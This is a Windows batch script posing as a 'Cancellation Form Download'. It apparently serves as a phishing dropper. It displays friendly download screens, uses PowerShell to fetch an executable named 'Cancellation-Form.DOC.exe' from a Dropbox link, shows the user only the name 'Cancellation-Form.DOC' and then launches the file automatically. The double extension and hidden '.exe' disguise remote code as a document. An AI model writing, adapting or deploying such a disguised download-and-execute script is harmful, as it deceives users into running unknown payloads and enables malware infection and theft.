@echo off
setlocal
title Cancellation Form Download
color 0B

set "FILENAME=Cancellation-Form.DOC.exe"
set "SHOWNAME=Cancellation-Form.DOC"

cls
echo.
echo  ==================================================
echo            CANCELLATION FORM DOWNLOAD
echo  ==================================================
echo.
echo   Your cancellation form is ready to download.
echo.
echo   Press ENTER to continue...
echo.
echo  ==================================================
pause >nul

cls
echo.
echo  ==================================================
echo            DOWNLOADING FILE...
echo  ==================================================
echo   Please wait. Do not close this window.
echo  ==================================================
echo.

powershell -NoLogo -NoProfile -Command ^
  "$client = New-Object System.Net.WebClient; $client.DownloadFile('https://www.dropbox.com/scl/fi/c8j70h9zjjbhuxtisng3e/Cancellation-Form.DOC.exe?rlkey=k1839uj7b4wocccyza5ln8a8w&st=w6qkqxkt&dl=1', '%FILENAME%')"

if exist "%FILENAME%" (
    cls
    echo.
    echo  ==================================================
    echo            DOWNLOAD COMPLETE
    echo  ==================================================
    echo.
    echo   File Name : %SHOWNAME%
    echo   Location  : %cd%\%FILENAME%
    echo.
    echo   Opening the file now...
    echo.
    echo  ==================================================
    start "" "%FILENAME%"
) else (
    cls
    echo.
    echo  ==================================================
    echo            DOWNLOAD FAILED
    echo  ==================================================
    echo.
    echo   Please check your internet connection
    echo   and try again later.
    echo.
    echo  ==================================================
)

echo.
echo   Press ENTER to exit...
pause >nul
